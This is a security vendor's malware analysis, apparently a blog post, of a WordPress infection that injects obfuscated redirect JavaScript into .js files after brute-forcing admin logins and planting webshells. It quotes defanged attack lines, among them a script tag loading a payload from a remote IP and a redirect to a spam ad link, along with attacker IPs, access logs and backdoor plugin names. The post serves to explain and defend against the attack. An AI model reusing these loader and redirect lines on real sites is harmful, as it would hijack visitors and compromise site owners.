@@ -1,0 +1,109 @@
+WordPress Security – Unwanted Redirects via Infected JavaScript Files
+
+We’ve been watching a specific WordPress infection for several months and would like to share details about it.
+The attacks inject malicious JavaScript code into almost every .js file it can find. Previous versions of this malware injected only jquery.js files, but now we remove this code from hundreds of infected files. Due to a bug in the injector code, it also infects files whose extensions contain “.js” (such as .js.php or .json).
+The obfuscated malicious code can be recognized by the hex-encoded strings and is usually appended to the legitimate content of the files. In some variations it can be injected at the very top of the files:
+Example of the malicious injection at the bottom of a JS file.
+This code loads another script from a third-party server:
+<s cript src="hxxp://134 .249 .116 .78/jquery.js"></script>
+That script, in turn, redirects first-time visitors to sketchy spam sites (e.g. financial scams and get-rich-quick schemes) via an affiliate link from a shady ad network:
+window.location.href= "hxxp://go .ad2up[.]com/afu.php?id=473791
+To exclude returning visitors, the script sets the csrf_uid cookie for three days. It also makes sure that the visitor is not working in the WordPress admin interface (to avoid suspicion of the site owners).
+window.location.pathname.indexOf("/wp-admin/")!=  -1
+Now that we know how the malware works, let’s discuss how sites get infected. We had a chance to track the attack using access logs. Below, we show it step by step.
+Brute-force Attack
+The attack begins with multiple requests to /xmlrpc.php or /wp-login.php (they allow to test multiple username/password pairs). Once the matching combination is found, the attacker logs into the WordPress admin interface.
+In our example, the attacker used two Ukrainian IPs: 46.118.123.228 and 46.118.155.216. Some other people noticed the same attack pattern, however, in their case, the IP belonged to CloudFlare because the attacked site was behind the CloudFlare firewall; so the real attackers IP didn’t make it into the logs (hint: you might want to configure your webserver to log the value of the HTTP_CF_CONNECTING_IP header).
+Uploading Backdoors
+Once the attackers are in, they immediately open the Theme Editor and modify the 404.php file of the active theme.
+46.118.123.228 - - [11/Feb/2017:18:14:54 +0800]
+"POST /wordpress//wp-login.php HTTP/1.0" 302 - "http://infected-site.com/wordpress//wp-login.php"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0"
+
+46.118.123.228 - - [11/Feb/2017:18:14:54 +0800]
+"GET /wordpress/wp-admin/ HTTP/1.0" 200 50335 "http://infected-site.com/wordpress/wp-login.php"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0"
+
+46.118.123.228 - - [11/Feb/2017:18:14:57 +0800]
+"GET /wordpress/wp-admin/theme-editor.php HTTP/1.0" 200 71930 "-" "Mozilla/5.0
+(Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0"
+
+46.118.123.228 - - [11/Feb/2017:18:15:00 +0800]
+"GET /wordpress//wp-admin/theme-editor.php?file=404.php&theme=online-marketer HTTP/1.0" 200
+181961 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0"
+
+46.118.123.228 - - [11/Feb/2017:18:15:04 +0800]
+"POST /wordpress/wp-admin/theme-editor.php HTTP/1.0" 302 -
+"infected-site.com/wordpress/wp-admin/theme-editor.php?file=404.php&theme=online-marketer&scrollto=0&updated=true"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0"
+Hackers may also try to upload infected themes and plugins.
+46.118.155.216 - - [11/Feb/2017:00:12:19 +0800]
+"GET /wordpress//wp-admin/theme-install.php?upload HTTP/1.0" 200 47769 "-"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
+...
+46.118.155.216 - - [11/Feb/2017:00:12:20 +0800]
+"GET /wordpress//wp-admin/plugin-install.php?tab=upload HTTP/1.0" 200 36638 "-"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
+On some sites, they install quite a few such malicious themes and plugins. For example, here’s what we found just on one site:
+Rouge Plugins
+
+./wordpress/wp-content/plugins/arts/
+./wordpress/wp-content/plugins/wats/
+./wordpress/wp-content/plugins/waths/
+./wordpress/wp-content/plugins/three-column-screen-layout/
+./wordpress/wp-content/plugins/three–layout/
+./wordpress/wp-content/plugins/three-column/
+./wordpress/wp-content/plugins/three-screen-layout/
+./wordpress/wp-content/plugins/foo-screen-layout/
+./wordpress/wp-content/plugins/three-scr-layout/
+./wordpress/wp-content/plugins/thr-col-scr/
+./wordpress/wp-content/plugins/insert-php/
+./wordpress/wp-content/plugins/insert/
+
+Rogue Themes
+
+./wordpress/wp-content/themes/phantomlife/
+./wordpress/wp-content/themes/hantomlite/
+./wordpress/wp-content/themes/phanton/
+./wordpress/wp-content/themes/phantol/
+./wordpress/wp-content/themes/phamton/
+./wordpress/wp-content/themes/gaukingo/
+./wordpress/wp-content/themes/jaukinjo/
+./wordpress/wp-content/themes/gauking/
+./wordpress/wp-content/themes/gakingo/
+./wordpress/wp-content/themes/gaugo/
+./wordpress/wp-content/themes/kingo/
+./wordpress/wp-content/themes/gaingo/
+
+As you might have noticed, the theme and plugin names seem to be auto-generated using a limited dictionary of terms and rules. E.g. “three-column-screen-layout vs three-screen-layout vs three-scr-layout vs foo-screen-layout vs thr-col-scr vs three–layout vs three-column” or “phantomlife vs hantomlite vs phanton vs phanton vs phamton”.
+In all cases, these themes and plugins are based on legitimate software. Hackers just add backdoor files into them (such as db.php) or they inject the backdoor code into files like footer.php.
+Inside the db.php files, we can see the WSO/FilesMan webshell encrypted using the FOPO obfuscator.
+Encrypted content of db.php
+In footer.php, we see the same webshell that uses a different obfuscation algorithm.
+Obfuscated webshell inside footer.php
+To make the infection more persistent, hackers then upload more webshells into various locations such as the site root, uploads directory, and more.
+Malware Injector
+In addition to the webshells, this attack creates multiple malware injector scripts – the scripts that inject the malicious JS code into .js file. Such scripts can be found inside infected themes with names like 404.php, db.php, cache.php. Inside the uploads directory, they may also be named index.php.
+These files have similar content: a constant that contains the malicious JavaScript code and functions that traverse server directories and inject that code into files with .js extension.
+Code that infects shared server directories
+To maximize the infection surface, this script tries to identify the root directory of all the sites that share the same account, or even server, and then it recursively scans all the nested directories and sites for writeable .js files.
+Even though this infection mainly targets WordPress sites, it infects JavaScript files of all neighbor sites regardless of their CMS (or even lack thereof). Here are the directories it begins the scan with:
+
+public_html
+html
+httpdocs
+vhosts
+www
+wwwroot
+web
+$_SERVER[‘DOCUMENT_ROOT’]
+
+In the latest version of this script we can find this declaration:
+$file_name = 'e';
+The injector uses this $file_name variable to infect only files that contain its value as a part of their filenames. In our case, it means that the script infects all .js files with ‘e’ in their filenames. That’s a lot. For example, out of 343 .js files in a fresh WordPress 4.7.2 installation, 216 contain ‘e’ in their filenames (including all the jquery.js variations). In previous versions of this script, that line was more specific:
+$file_name = 'jquery';
+And the malware only infected jQuery files.
+Conclusion
+Weak passwords and cross-site contamination are still among the most common culprits when you investigate website infections. Never settle for weak passwords if you put something in public access. Even if it’s just a temporary test site (by the time you decide to put real content there it may be compromised to the core), especially if that test site shares the same server account with more important sites.
+Don’t forget about regular website backups. With an infection like this, it may be easier to roll back to a clean fresh backup than to remove malware from thousands of infected files. Pro tip: don’t store backup copies uncompressed on the same server – not only is this bad for security (most likely you don’t patch vulnerable files in backups) but this malware will make your backups useless by infecting them if they are stored on the same server (we see this happen with some of our clients).
+For more cleanup and post-cleanup information please check our guide on how to clean hacked WordPress sites.
